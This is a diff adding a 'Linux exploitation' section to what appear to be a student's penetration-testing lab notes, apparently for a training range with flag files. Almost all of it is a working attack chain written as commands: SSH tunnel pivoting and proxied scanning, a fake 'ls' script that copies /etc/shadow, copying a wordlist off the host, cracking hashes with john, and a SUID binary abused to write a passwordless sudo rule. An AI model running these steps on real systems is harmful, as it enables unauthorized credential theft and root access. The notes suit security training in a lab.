@@ -172,6 +172,42 @@ ON MACHINE BEING EXPLOITED
 10. msfvenom -p windows/exec CMD='cmd.exe /C type C:\Users\Admin\Desktop\flag.txt > C:\\flag.txt' -f dll > hijackmeplz.dll
 
      
+#########################
+  LINUX EXPLOITATION 
+#########################
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -L 3002:192.168.28.105:2222 -NT
+3. ssh -p 3002 comrade@localhost -D 9050 -NT
+4. proxychains nmap -Pn 192.168.28.27 -T4
+5. ssh -p 3002 comrade@localhost -L 3003:192.168.28.27:22 -NT
+6. cd /tmp
+      vim ls
+            #!/bin/bash
+            echo $(/bin/ls /home/billybob) > lst.txt
+            sudo cat /etc/shadow > shadow.txt
+7. chmod +x ls 
+8. wait until list comes up and adjust script as necessary
+      sudo cat /home/billybob/10-million-password-list-top-10000.txt > /tmp/cracker.txt
+      sudo cat /home/billybob/f!@g1.txt > /tmp/flag.txt
+      echo $(/bin/ls /home/billybob/logs) > /tmp/log.txt
+9. scp -P 3003 comrade@localhost:/tmp/cracker.txt .
+10. line=$(cat cracker.txt)
+11. for word in $line; do echo $word; done >> cracker2.txt
+12. john --wordlist=cracker2.txt shadow.txt
+13. ssh -p 3003 zeus@localhost
+14. ssh -p 3002 comrade@localhost -L 3004:192.168.28.12:22 -NT
+15. ssh -p 3004 comrade@localhost
+16. find / -type f -perm /4000 -ls 2>/dev/null
+17. test each tool of gtfo bins
+18. ./unkown /etc/sudoers "comrade ALL=(ALL) NOPASSWD:ALL"
+19. sudo -i
+20. 
+
+
+
+
+
+
 
 
 
